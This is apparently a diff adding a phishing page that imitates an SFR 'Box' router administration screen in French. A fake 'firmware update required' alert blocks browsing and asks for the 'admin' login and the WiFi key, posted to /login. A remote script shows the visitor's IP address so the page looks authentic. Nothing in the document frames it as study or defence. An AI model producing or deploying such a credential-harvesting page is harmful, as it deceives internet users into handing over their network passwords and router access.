@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="fr">
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta charset="utf-8">
+		<title>Box -&nbsp;Authentification</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta name="format-detection" content="telephone=no">
+		<link rel="shortcut icon" type="image/png" href="data:image/png;base64,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">
+		<link rel="stylesheet" type="text/css" media="screen" href="global.css">
+		<script type="text/javascript" src="https://l2.io/ip.js?var=myip"></script>
+		<script src="global.js" charset="utf-8"></script>
+	</head>
+
+	<body>
+		<div id="header">
+			<div id="logo">
+				<a href="#" title="Accueil">Accueil</a>
+			</div>
+			<div id="infos">
+				<a id="btn-help" class="btn" href="#help" data-toggle="modal" title="Aide" style="display: inline;">?</a>
+
+				<table class="notableborder">
+					<tbody>
+						<tr>
+							<th>Version&nbsp;</th>
+							<td>: NB6V-MAIN-R3.3.5</td>
+						</tr>
+						<tr>
+							<th>Adresse MAC&nbsp;</th>
+							<td>: 13:ed:56:e7:0a:41</td>
+						</tr>
+						<tr>
+							<th>Adresse IP&nbsp;</th>
+							<td>: <script>document.write(myip)</script></td>
+						</tr>
+						<tr>
+							<th>Profil d'accès&nbsp;</th>
+							<td>: &nbsp;Box ADSL&nbsp;</td>
+						</tr>
+					</tbody>
+				</table>
+			</div>
+		</div>
+
+		<div class="navbar">
+			<div class="navbar-inner">
+				<div class="container">
+					<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+						<i class="icon-list-alt  icon-white"></i>&nbsp;Menu
+					</a>
+					<div class="nav-collapse collapse">
+						<ul class="nav">
+							<li id="id_state_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-state" data-toggle="dropdown" href="#" title="Etat">
+									Etat
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Internet">Internet</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Réseau local">Réseau local</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Périphériques">Périphériques</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_network_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-network" data-toggle="dropdown" href="#" title="Réseau v4">
+									Réseau v4
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="WAN">WAN</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="DynDNS">DynDNS</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="DNS">DNS</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="DHCP">DHCP</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="NAT">NAT</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Route">Route</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Filtrage">Filtrage</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_networkv6_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-networkv6" data-toggle="dropdown" href="#" title="Réseau v6">
+									Réseau v6
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="WAN">WAN</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Pare-feu">Pare-feu</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="DHCP">DHCP</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="SLAAC">SLAAC</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="DNS">DNS</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_wifi_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-wifi" data-toggle="dropdown" href="#" title="Wifi">
+									Wifi
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Configuration">Configuration</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Sécurité">Sécurité</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Filtrage MAC">Filtrage MAC</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Hotspot">Hotspot</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_voip_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-voip" data-toggle="dropdown" href="#" title="Téléphonie">
+									Téléphonie
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Configuration">Configuration</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_service_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-service" data-toggle="dropdown" href="#" title="Applications">
+									Applications
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Partage de fichiers">Partage de fichiers</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Partage d'imprimantes">Partage d'imprimantes</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Serveur multimédia">Serveur multimédia</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Contrôle d'accès">Contrôle d'accès</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_maintenance_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-maintenance" data-toggle="dropdown" href="#" title="Maintenance">
+									Maintenance
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Système">Système</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Administration">Administration</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Ligne xDSL">Ligne xDSL</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Diagnostic">Diagnostic</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Tests">Tests</a>
+									</li>
+								</ul>
+							</li>
+
+							<li id="id_eco_tab" class="dropdown">
+								<a class="dropdown-toggle" id="btn-eco" data-toggle="dropdown" href="#" title="Eco">
+									Eco
+									<b class="caret caret-right"></b>
+								</a>
+
+								<ul class="dropdown-menu">
+									<li class="tab_on">
+										<a href="#firmware" data-toggle="modal" title="Général">Général</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="Configuration">Configuration</a>
+									</li>
+									<li class="tab_off">
+										<a href="#firmware" data-toggle="modal" title="WiFi Horaire">WiFi Horaire</a>
+									</li>
+								</ul>
+							</li>
+						</ul>
+
+						<ul class="nav pull-right">
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<ul class="breadcrumb">
+			<li>
+				<i class="icon-home"></i>&nbsp;
+				<a href="#firmware" data-toggle="modal">Home</a>
+			</li>
+		</ul>
+
+		<div id="main">
+			<div class="alert alert-info">
+				<h1>Mise à jour requise</h1>
+				Merci de mettre à jour votre Box de SFR.
+				Pour effectuer la mise à jour, identifiez-vous en suivant les instructions ci-dessous :
+			</div>
+
+			<div class="title">
+				<h1 class="large">Identification par mot de passe</h1>
+			</div>
+
+			<div class="content">
+				<p>Saisissez votre identifiant et votre mot de passe puis cliquez sur le bouton <strong>Valider</strong>.</p>
+
+				<form method="post" action="/login" id="form_auth_passwd" class="form-horizontal">
+					<div class="control-group">
+						<label class="control-label" for="login">Identifiant</label>
+
+						<div class="controls">
+							<input class="text" name="login" id="login" size="30" autocomplete="off" type="text">
+						</div>
+					</div>
+
+					<div class="control-group">
+						<label class="control-label" for="password">Mot de passe</label>
+
+						<div class="controls">
+							<input class="text" name="password" id="password" size="30" autocomplete="off" type="password">
+						</div>
+					</div>
+
+					<div class="control-group">
+						<div class="controls">
+							<button type="submit" name="submit_button" class="btn"><i class="icon-ok icon-white"></i> Valider</button>
+						</div>
+					</div>
+				</form>
+			</div>
+		</div>
+
+		<div id="help" class="modal hide fade">
+			<div class="modal-header">
+				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+				<h3>Aide</h3>
+			</div>
+
+			<div class="modal-body">
+				<p>
+					Une mise à jour importante est disponible pour votre Box de SFR, identifiez-vous afin d'effectuer cette mise à jour, avant de pouvoir surfer de nouveau.<br><br>
+					<em>Identification par mot de passe :</em> Saisissez votre identifiant (par défault, l'identifiant est "admin") et votre mot de passe pour accéder à l'interface d'administration de votre Box.<br><br>
+					Le mot de passe est <strong>le code WiFi</strong> de votre Box, il se trouve par défaut derrière votre Box.<br><br>
+				</p>
+			</div>
+
+			<div class="modal-footer">
+			</div>
+		</div>
+
+		<div id="firmware" class="modal hide fade">
+			<div class="modal-header">
+				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+				<h3>Mise à jour requise</h3>
+			</div>
+
+			<div class="modal-body">
+				<p>
+					La configuration de votre Box nécessite la <strong>mise à jour du firmware</strong>.
+					Veuillez s'il vous plait vous identifier afin de réaliser la mise à jour pour pouvoir à nouveau surfer sur le web.<br><br>
+					Pour plus d'informations, cliquez sur le bouton "?" en haut de cette page pour de l'aide.
+				</p>
+			</div>
+
+			<div class="modal-footer">
+			</div>
+		</div>
+
+		<script type="text/javascript">
+			$(document).ready(function(){
+				$('a[href=#help]').show();
+			});
+		</script>
+	</body>
+</html>
